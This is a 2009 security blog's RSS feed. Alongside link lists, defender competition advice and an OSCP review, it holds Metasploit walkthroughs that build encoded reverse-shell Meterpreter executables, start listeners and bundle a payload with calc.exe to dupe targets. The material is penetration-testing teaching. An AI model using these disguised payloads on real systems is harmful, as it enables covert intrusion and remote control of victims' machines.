+Hex Blog - &lt;a href=&#34;http://www.hexblog.com/&#34;&gt;http://www.hexblog.com/&lt;/a&gt;&lt;br /&gt;
+Engineering for Fun - &lt;a href=&#34;http://blog.engineeringforfun.com/&#34;&gt;http://blog.engineeringforfun.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;company:928412f226e1ec8c65ef7891df73816f&#34;&gt;Company &amp;mdash;&lt;/h3&gt;
+
+&lt;p&gt;OpenRCE - &lt;a href=&#34;http://www.openrce.org/articles/&#34;&gt;http://www.openrce.org/articles/&lt;/a&gt;&lt;br /&gt;
+DV Labs - &lt;a href=&#34;http://dvlabs.tippingpoint.com/blog/&#34;&gt;http://dvlabs.tippingpoint.com/blog/&lt;/a&gt;&lt;br /&gt;
+Matasano - &lt;a href=&#34;http://www.matasano.com/log/&#34;&gt;http://www.matasano.com/log/&lt;/a&gt;&lt;br /&gt;
+VeraCode - &lt;a href=&#34;http://www.veracode.com/blog/&#34;&gt;http://www.veracode.com/blog/&lt;/a&gt;&lt;br /&gt;
+Trend Micro - &lt;a href=&#34;http://blog.trendmicro.com/&#34;&gt;http://blog.trendmicro.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;forums:928412f226e1ec8c65ef7891df73816f&#34;&gt;Forums &amp;mdash;&lt;/h3&gt;
+
+&lt;p&gt;Reverse Engineering - &lt;a href=&#34;http://community.reverse-engineering.net/index.php&#34;&gt;http://community.reverse-engineering.net/index.php&lt;/a&gt;&lt;br /&gt;
+OpenRCE - &lt;a href=&#34;http://www.openrce.org/forums/&#34;&gt;http://www.openrce.org/forums/&lt;/a&gt;&lt;br /&gt;
+Assembly Forums - &lt;a href=&#34;http://www.asmcommunity.net/board/&#34;&gt;http://www.asmcommunity.net/board/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;sandboxing-and-analysis:928412f226e1ec8c65ef7891df73816f&#34;&gt;Sandboxing and Analysis &amp;mdash;&lt;/h3&gt;
+
+&lt;p&gt;Joe Box - &lt;a href=&#34;http://www.joebox.org/&#34;&gt;http://www.joebox.org/&lt;/a&gt;&lt;br /&gt;
+Virus Total - &lt;a href=&#34;http://www.virustotal.com/&#34;&gt;http://www.virustotal.com/&lt;/a&gt;&lt;br /&gt;
+Wepawet - &lt;a href=&#34;http://wepawet.cs.ucsb.edu/&#34;&gt;http://wepawet.cs.ucsb.edu/&lt;/a&gt;&lt;br /&gt;
+F-Secure -&lt;a href=&#34;http://www.f-secure.com/en_US/security/security-lab/&#34;&gt;http://www.f-secure.com/en_US/security/security-lab/&lt;/a&gt;&lt;br /&gt;
+Anubis - &lt;a href=&#34;http://anubis.iseclab.org/&#34;&gt;http://anubis.iseclab.org/&lt;/a&gt;&lt;br /&gt;
+Jotti - &lt;a href=&#34;http://virusscan.jotti.org/en&#34;&gt;http://virusscan.jotti.org/en&lt;/a&gt;&lt;br /&gt;
+Sunbelt CWSandbox - &lt;a href=&#34;http://www.sunbeltsecurity.com/Submit.aspx?type=cwsandbox&amp;amp;cs=A41CD150B37359889A553671CBFD2360&#34;&gt;http://www.sunbeltsecurity.com/Submit.aspx?type=cwsandbox&amp;amp;cs=A41CD150B37359889A553671CBFD2360&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;misc:928412f226e1ec8c65ef7891df73816f&#34;&gt;Misc &amp;mdash;&lt;/h3&gt;
+
+&lt;p&gt;Code Breakers Journal - &lt;a href=&#34;http://www.codebreakers-journal.com/&#34;&gt;http://www.codebreakers-journal.com/&lt;/a&gt;&lt;br /&gt;
+The Art of Assembly - &lt;a href=&#34;http://webster.cs.ucr.edu/AoA/DOS/AoADosIndex.html&#34;&gt;http://webster.cs.ucr.edu/AoA/DOS/AoADosIndex.html&lt;/a&gt;&lt;br /&gt;
+Intel Processor Instruction Set A-M/N-Z - &lt;a href=&#34;http://www.intel.com/products/processor/manuals/&#34;&gt;http://www.intel.com/products/processor/manuals/&lt;/a&gt;&lt;br /&gt;
+WASM.ru with translation - &lt;a href=&#34;http://66.196.80.202/babelfish/translate_url_content?lp=ru_en&amp;amp;url=http://www.wasm.ru&amp;amp;.intl=us&#34;&gt;http://66.196.80.202/babelfish/translate_url_content?lp=ru_en&amp;amp;url=http://www.wasm.ru&amp;amp;.intl=us&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2009-10-11 06:27 by Rob Fuller&lt;/p&gt;
+
+&lt;p&gt;The Malware Distribution Project posted a comment a while back letting us know of their project so that it could be added to the list:&lt;/p&gt;
+
+&lt;p&gt;MD:Pro - &lt;a href=&#34;http://frame4.net/&#34;&gt;http://frame4.net/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And their &amp;lsquo;more up-to-date&amp;rsquo; Fravia archive: &lt;a href=&#34;http://fravia.frame4.com/&#34;&gt;http://fravia.frame4.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Sorry it took so long getting around to adding it.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PassiveX fun with Metasploit</title>
+      <link>http://localhost:1313/post/2009/2009610passivex-fun-with-metasploit-html/</link>
+      <pubDate>Wed, 10 Jun 2009 13:21:05 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009610passivex-fun-with-metasploit-html/</guid>
+      <description>&lt;p&gt;I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the &lt;a href=&#34;http://localhost:1313/archives/440-metasploit-2.html&#34;&gt;IExpress “hack”&lt;/a&gt; would make for an very hard to spot payload.&lt;/p&gt;
+
+&lt;p&gt;A really down and dirty explination of what PassiveX is and why it&amp;rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back. So someone looking for a rogue process will only see Internet Explorer open and talking over port 443 (as specified).&lt;/p&gt;
+
+&lt;p&gt;(props to skape for writting PassiveX and @&lt;a href=&#34;http://twitter.com/_natron_&#34;&gt;&lt;em&gt;natron&lt;/em&gt;&lt;/a&gt; for kicking in the latest tweaks to make it work with IE7/IE8)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Here are the options for msfpayload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Usage: ./msfpayload &lt;payload&gt; [var=val] &lt;S[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;And msfencode&amp;rsquo;s options if you chose to use it as I demonstrate below. However, encoding happens by default with msfpayload (IIRC):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;./msfencode -h&lt;/p&gt;
+
+&lt;p&gt;Usage: ./msfencode &lt;options&gt;&lt;/p&gt;
+
+&lt;p&gt;OPTIONS:&lt;/p&gt;
+
+&lt;p&gt;-a &lt;opt&gt; The architecture to encode as&lt;br /&gt;
+-b &lt;opt&gt; The list of characters to avoid: &amp;lsquo;x00xff&amp;rsquo;&lt;br /&gt;
+-c &lt;opt&gt; The number of times to encode the data&lt;br /&gt;
+-e &lt;opt&gt; The encoder to use&lt;br /&gt;
+-h Help banner&lt;br /&gt;
+-i &lt;opt&gt; Encode the contents of the supplied file path&lt;br /&gt;
+-l List available encoders&lt;br /&gt;
+-m &lt;opt&gt; Specifies an additional module search path&lt;br /&gt;
+-n Dump encoder information&lt;br /&gt;
+-o &lt;opt&gt; The output file&lt;br /&gt;
+-s &lt;opt&gt; The maximum size of the encoded data&lt;br /&gt;
+-t &lt;opt&gt; The format to display the encoded buffer with (c, elf, exe, java, perl, raw, ruby, vba)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Here we create the PassiveX payload. Note the PX options instead of the LHOST/LPORT:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe&lt;/p&gt;
+
+&lt;p&gt;[*] x86/shikata_ga_nai succeeded with size 97 (iteration=1)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Now that we have our &amp;ldquo;malicious payload&amp;rdquo; in /tmp we get our listener ready (you can use msfcli as well, I just like msfconsole because it provides me more flexibility):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;./msfconsole&lt;/p&gt;
+
+&lt;p&gt;_&lt;br /&gt;
+| | o&lt;br /&gt;
+_ _ _ _ &lt;em&gt;|&lt;/em&gt; &lt;strong&gt;, , _ | | __ &lt;em&gt;|&lt;/em&gt;&lt;br /&gt;
+/ |/ |/ | |/ | / | / &lt;em&gt;|/ _|/ / _| |&lt;br /&gt;
+| | |&lt;/em&gt;/|&lt;/strong&gt;/|&lt;em&gt;/&lt;/em&gt;/|&lt;em&gt;/ / |&lt;strong&gt;/ |&lt;/strong&gt;/__/ |&lt;/em&gt;/|_/&lt;br /&gt;
+/|&lt;br /&gt;
+|&lt;/p&gt;
+
+&lt;p&gt;=[ msf v3.3-dev&lt;br /&gt;
++ &amp;ndash; &amp;ndash;=[ 376 exploits - 234 payloads&lt;br /&gt;
++ &amp;ndash; &amp;ndash;=[ 20 encoders - 7 nops&lt;br /&gt;
+=[ 153 aux&lt;/p&gt;
+
+&lt;p&gt;msf &amp;gt; use multi/handler&lt;br /&gt;
+msf exploit(handler) &amp;gt; exploit -h&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;(I&amp;rsquo;m showing you &amp;lsquo;exploit&amp;rsquo;s options because a lot of people don&amp;rsquo;t know they exist. With two lines you can start your listener (use, then exploit):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Usage: exploit [options]&lt;br /&gt;
+Launches an exploitation attempt.&lt;/p&gt;
+
+&lt;p&gt;OPTIONS:&lt;br /&gt;
+-e &lt;opt&gt; The payload encoder to use. If none is specified, ENCODER is used.&lt;br /&gt;
+-h Help banner.&lt;br /&gt;
+-j Run in the context of a job.&lt;br /&gt;
+-n &lt;opt&gt; The NOP generator to use. If none is specified, NOP is used.&lt;br /&gt;
+-o &lt;opt&gt; A comma separated list of options in VAR=VAL format.&lt;br /&gt;
+-p &lt;opt&gt; The payload to use. If none is specified, PAYLOAD is used.&lt;br /&gt;
+-t &lt;opt&gt; The target index to use. If none is specified, TARGET is used.&lt;br /&gt;
+-z Do not interact with the session after successful exploitation.&lt;/p&gt;
+
+&lt;p&gt;msf exploit(handler) &amp;gt; exploit -j -z -p windows/reflectivemeterpreter/reverse_http -o PXHOST=0.0.0.0,PXPORT=443,PXURI=/,ExitOnSession=False&lt;/p&gt;
+
+&lt;p&gt;[&lt;em&gt;] Exploit running as background job.&lt;br /&gt;
+[&lt;/em&gt;] PassiveX listener started.&lt;br /&gt;
+[*] Starting the payload handler&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;msf exploit(handler) &amp;gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Listener ready to go. I chose IP: 0.0.0.0 just to make things easy. Just send off maliciouspayload.exe to your target and you&amp;rsquo;re set.&lt;/strong&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Metasploit heart&#39;s Microsoft</title>
+      <link>http://localhost:1313/post/2009/200932metasploit-hearts-microsoft-html/</link>
+      <pubDate>Mon, 02 Mar 2009 19:24:23 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/200932metasploit-hearts-microsoft-html/</guid>
+      <description>&lt;p&gt;&lt;a href=&#34;http://vimeo.com/3440084&#34;&gt;Hiding Meterpreter with IExpress&lt;/a&gt; from &lt;a href=&#34;http://vimeo.com/user780705&#34;&gt;mubix&lt;/a&gt; on &lt;a href=&#34;http://vimeo.com&#34;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it&amp;rsquo;s easyier to dupe, or a different malicious executable (leekspin perhaps?).&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;ll let your minds take this to the level I know you all are capable of. One caveat is that the icon for the executable is that of the self extractor, which shouldn&amp;rsquo;t be that much of an issue to change, but I don&amp;rsquo;t know off the top of my head of an app that does it, so please comment and let me know if you do.&lt;/p&gt;
+
+&lt;p&gt;Commands from video:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=1080 X &amp;gt; /tmp/academy/bob.exe&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;(For python 2.4+) python -m SimpleHTTPServer&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;(For python 2.3 -) python -c &amp;ldquo;from SimpleHTTPServer import test; test()&amp;rdquo;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Start -&amp;gt; Run -&amp;gt; iexpress &lt;return&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Run multi/hander from command line (not shown in video)&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Links from video:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.metasploit.com/&#34;&gt;http://www.metasploit.com/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.shell-fu.org/&#34;&gt;http://www.shell-fu.org/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.microsoft.com/technet/prodtechnol/ie/ieak/techinfo/deploy/60/en/iexpress.mspx?mfr=true&#34;&gt;http://www.microsoft.com/technet/prodtechnol/ie/ieak/techinfo/deploy/60/en/iexpress.mspx?mfr=true&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.virustotal.com/&#34;&gt;http://www.virustotal.com/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.theacademypro.com/&#34;&gt;http://www.theacademypro.com/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;http://www.theacademyhome.com/&#34;&gt;http://www.theacademyhome.com/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Winning Hacker Competitions as Defenders</title>
+      <link>http://localhost:1313/post/2009/2009220winning-hacker-competitions-as-defenders-html/</link>
+      <pubDate>Fri, 20 Feb 2009 16:43:44 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/2009220winning-hacker-competitions-as-defenders-html/</guid>
+      <description>
+
+&lt;p&gt;Let me start off this post by saying that the main focus of any of these competitions is not to win, but to learn. Learning is usually accompanied by tears on the defenders side, but the best way to learn is to fail.&lt;/p&gt;
+
+&lt;p&gt;That said though, the title of this post is about how to win:&lt;/p&gt;
+
+&lt;h3 id=&#34;planning-phase:e72aba3953b950f52731ddd08b635e63&#34;&gt;Planning Phase:&lt;/h3&gt;
+
+&lt;p&gt;This is where you win or lose. If you don&amp;rsquo;t have a good plan and a good team layout ahead of time, you are screwed. We (the &amp;lsquo;red cell&amp;rsquo;) will walk all over the fact that you can&amp;rsquo;t get your team organized and execute.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Know your infrastructure&lt;/strong&gt;: Assign people not only to the different parts, but to also learn those parts BEFORE go time. &lt;strong&gt;Practice&lt;/strong&gt;.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Team Organization&lt;/strong&gt;: This means that you are going need assigned team leads. For instance this is how you can have it laid out for a 5 person team and what their roles would do.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;1. **Team Lead**: This person needs to lead. Duh right? Well there is more to it; they need to know each of the other roles on a generic technical level. They also have to be to go-to person, any calls that come in as &#39;business injects&#39;, emails, whatever, they need to be the one to deal with it. They also need to be up to date with what each person is doing and keeping them on task. They should not be on a keyboard unless they are really needed to be (i.e. supporting lunch switch outs, or responding via email to a biz inject)
+
+
+
+
+2. **Patch / Software Retrieval / Software Installation**: This is the gopher. He / She needs to know the best and fastest ways to download patches and software that will be needed. And how to get them to install quicker or in the background. Generating a list of links and posting them somewhere online so that you can just go to that page and click down the list will help extremely, especially if you aren&#39;t allowed to take anything into the competition (i.e. USB drives). (google: ctupdate4). The list should include direct links to patches, av, known good software that each team member will need, etc other. And possibly bundle it up so that it is just that much faster to pull down. Use a download manager to pull it down (DownThemAll w/ FireFox). Every second you waste on waiting for software is more time for a &#39;red cell&#39; member to entrench themselves.
+
+
+
+
+3. **Incident Responder**: At first this person may not be busy, but needs to know incident response inside and out. How to check for network connections, and rouge processes. Needs to have a list of services that run on a Windows 2000, XP and 2003 box. This would also be the keeper of the password list and the person to make the call when passwords need to be changed. But more on that later. Know TCPView, Autoruns, and Procexp like the back of your hand, and rename the executables so that when the red cell looks for you running monitoring tools they won&#39;t be able to differentiate.
+
+
+
+
+4. **Infrastructure / Linux Guru**: This person needs to know Cisco and Linux. Know how to set passwords for the interfaces, vty, console, aux and so on. Know how to encrypt those passwords. Know how to turn off unneeded ports (nudge nudge). Have a print out of commands to do all these things as well as ACL manipulation (deny any/any is a great place to start, then build upon what you **need** to allow **out** and **in**). Know how to manually reset passwords in Cisco switches, routers, pix, and Linux machines (single user mode).
+
+
+
+
+5. **Monitoring**: General administration and monitoring is the main focus for this one. As soon as there is any sign of compromise, they inform the Incident Responder and continue to monitor the other systems. This person needs as much visual real-estate as possible they need to have all kinds of monitoring (process, network and services) tools up and running. Also, they need to be scanning the network constantly (AutoScan&#39;s Intrusion Alert is your friend) for any &#39;new&#39; IP addresses that show up. Watch for ARP spoofing (google: DecaffeinatID)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Have a password policy&lt;/strong&gt;: Do not use the same password on all of your systems. A lot of teams do this for speed and team dynamics but you can keep both if you circulate that password policy around your team and it is well known. For example. Your active directory domain controllers could have an admin password of &amp;ldquo;$tupid Active Directory Pa$$word&amp;rdquo;, changing only the middle part of the pass phrase for whatever system you are dealing with. Then when you encounter something that is a bit more constrained, like a router, switch or firewall, you can easily concatenate it to be something like &amp;ldquo;$tupidrtrPa$$word&amp;rdquo;. This is where knowing your infrastructure helps. Have a password sheet on a printed (not digital). Keep it in a folder, and keep it closed unless you have someone forget the password for some reason. Have at least 3 iterations of this sheet with a different password structure for each one. Make scheduled changes of all the passwords. If there is 3 days to the competition, have it change twice a day, once in the morning and once in the afternoon. Doing this will not only keep those system passwords from being static targets, it will also give you an idea of what is compromised that you might not have seen (i.e. you can&amp;rsquo;t change the password because it was already changed for you)&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Firewalls&lt;/strong&gt;: Almost all systems these days have host based firewalls (Windows Firewall / Linux IPTABLES). Learn them, find out how to turn them on and configure them with a default deny rule set.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Have a plan&lt;/strong&gt;: Generate a generic plan of attack and each night discuss and plan the next day&amp;rsquo;s defense.&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;execution-phase:e72aba3953b950f52731ddd08b635e63&#34;&gt;Execution Phase:&lt;/h3&gt;
+
+&lt;p&gt;Do what you planned, and stick to it. Plan for Armageddon and hope for cake. Once you have done all of the basics that you can plan for, then all you have to worry about are your public facing services (Web, FTP etc.)&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Web Applications&lt;/strong&gt;: These are on the for-front of today&amp;rsquo;s security watch list. The reason? Because they HAVE to be accessible. How do you fight / protect it? Log review. Now in an actual live site, it would be difficult to impossible to really watch logs effectively. However in the dynamic sites these days where files on the server don&amp;rsquo;t change, just the database, it would behoove you to put something like &lt;strong&gt;tripwire&lt;/strong&gt; (linux or windows) to watch the files in the web directory for changes. If a file gets added to that directory you know that it needs to be investigated. Don&amp;rsquo;t stop the investigation at deleting the file either, look through the logs, find out how it got there and close up the hole.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;FTP&lt;/strong&gt;: Set up your FTP server to log attempts to login. Open the logs with tail -f (linux) or BareTail (windows) and watch it. If you see someone trying to brute-force login or someone logging in that shouldn&amp;rsquo;t be, start investigating.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Other&lt;/strong&gt;: It basically falls back to the basics with all services. Watch the logs for anomalies.&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;That&amp;rsquo;s really it folks. Have you been on either side? Comment and let others know how they can better prepare.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>The Middler gets released at ShmooCon!</title>
+      <link>http://localhost:1313/post/2009/200927the-middler-gets-released-at-shmoocon-html/</link>
+      <pubDate>Sat, 07 Feb 2009 20:22:02 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/200927the-middler-gets-released-at-shmoocon-html/</guid>
+      <description>&lt;p&gt;The official link is up and here it is.. well, until they release the beta:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://inguardians.com/tools/middler-alpha.tgz&#34;&gt;http://inguardians.com/tools/middler-alpha.tgz&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt; Keep up with &lt;a href=&#34;http://www.inguardians.com/&#34;&gt;http://www.inguardians.com/&lt;/a&gt; for all of their great tools.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Offensive Security Certified Professional</title>
+      <link>http://localhost:1313/post/2009/200921offensive-security-certified-professional-html/</link>
+      <pubDate>Sun, 01 Feb 2009 18:53:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/200921offensive-security-certified-professional-html/</guid>
+      <description>&lt;p&gt;I recently obtained the status &lt;strong&gt;Offensive Security Certified Professional&lt;/strong&gt;. It is one of the best courses I have ever taken. It challenged me to think and learn new skills on the fly. You start the course with a bunch of video files, a huge pdf and an lzm file to get your VPN setup. It is self paced and intense. The topics cover everything from &lt;a href=&#34;http://www.remote-exploit.org/&#34;&gt;Back|Track&lt;/a&gt; basics to the HXDEF rootkit.&lt;/p&gt;
+
+&lt;p&gt;Here is the problem, you can&amp;rsquo;t get a job with it. I know that seems shallow, but let me explain. As I see it there are basically 3 types of certifications or for that matter education in general that you can go through. The first gets you a job. The second teaches you something. The third is good for you or fun.This course is fun but more so falls in the &amp;lsquo;teaches you something&amp;rsquo; category. The CISSP on the other hand help you get a job, but I&amp;rsquo;ll hold that topic for another post.&lt;/p&gt;
+
+&lt;p&gt;Well, the &lt;a href=&#34;http://offensive-security.com/offsec101.php&#34;&gt;Offensive Security 101&lt;/a&gt; course (leads to the OSCP test), is not quite on the radars of any recruiters or for that matter companies yet. Which is truly a shame. Unlike the CISSP and almost every other certification that I know of or heard of via 3rd party, this cert makes you &amp;ldquo;&lt;em&gt;&lt;strong&gt;try harder&lt;/strong&gt;&lt;/em&gt;&amp;rdquo;. And all of the pain ends in a 24 hour marathon of hacking, where you will be an idiot not to use every second of it.&lt;/p&gt;
+
+&lt;p&gt;I have been a huge supporter of Back|Track for ages and they have really shifted my thinking of certifications by providing the Offsec 101 course. I can&amp;rsquo;t wait to take their other courses, Wi-Fu and Back|Track to the Max (which I am told that my mind will melt during the course of study). They also have some &lt;a href=&#34;http://offensive-security.com/ilt.php&#34;&gt;instructor led training&lt;/a&gt; so you can get one on one with Muts or one of the other crazy brains behind &lt;a href=&#34;http://offensive-security.com&#34;&gt;OFFENSIVE SECURITY&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;You can sign up for classes via their website: &lt;a href=&#34;http://offensive-security.com/training.php&#34;&gt;http://offensive-security.com/training.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Also check out some of their videos here: &lt;a href=&#34;http://offensive-security.com/videos.php&#34;&gt;http://offensive-security.com/videos.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;**Update: **Back|Track to the Max is now named:&lt;a href=&#34;http://offensive-security.com/ctp.php&#34;&gt; Cracking the Perimeter&lt;/a&gt; which ends in your OSCE (Offensive Security Certified Expert) exam.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
